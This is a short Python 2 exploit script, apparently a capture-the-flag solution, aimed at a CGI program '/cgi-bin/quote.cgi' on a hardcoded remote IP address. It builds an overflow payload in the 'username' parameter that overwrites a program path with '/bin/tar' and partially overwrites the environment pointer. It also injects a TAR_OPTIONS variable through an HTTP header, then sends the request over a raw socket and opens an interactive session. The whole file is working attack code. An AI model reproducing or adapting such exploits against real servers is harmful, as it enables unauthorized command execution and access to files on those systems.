from pwnlib import *
import requests

LOCAL = False

if LOCAL:
	TARGET = "localhost"
	PORT = 1080
else:
	TARGET = "78.46.224.68"
	PORT = 80

def urlencode(s, encode_all=False):
	res = ""
	for c in s:
		if ord(c) < 0x20 or ord(c) > 0x7e or encode_all:
			res += "%" + c.encode("hex")
		else:
			res += c
	return res

# fake environment variable
envvar = "TAR_OPTIONS=-v -c /tmp"
print len(envvar)

# the program to execute
path = "/bin/tar\x00"
path += pattern(0x20 - len(path))

# needed for survival
null_ptr = 0x601e90

# this partially overwrites the environment
environ  = chr(0xb3 + 19 - len(envvar))

payload  = "A"*0x200
payload += path
payload += pq(null_ptr)
payload += "B"*0x100
payload += environ

# construct the request
target  = "/cgi-bin/quote.cgi?"
target += "nasty=no"
target += "&username=" + urlencode(payload) 

request  = "GET " + target  + " HTTP/1.1\r\n"
request += "Host: %s\r\n" % TARGET
request += "Test: " + envvar + "\r\n"
request += "\r\n"*2

s = Socket((TARGET, PORT))
s.send(request)

s.ru("Here's a little quote for you:")
s.ru("\n")
s.ru("\n")


s.interact()
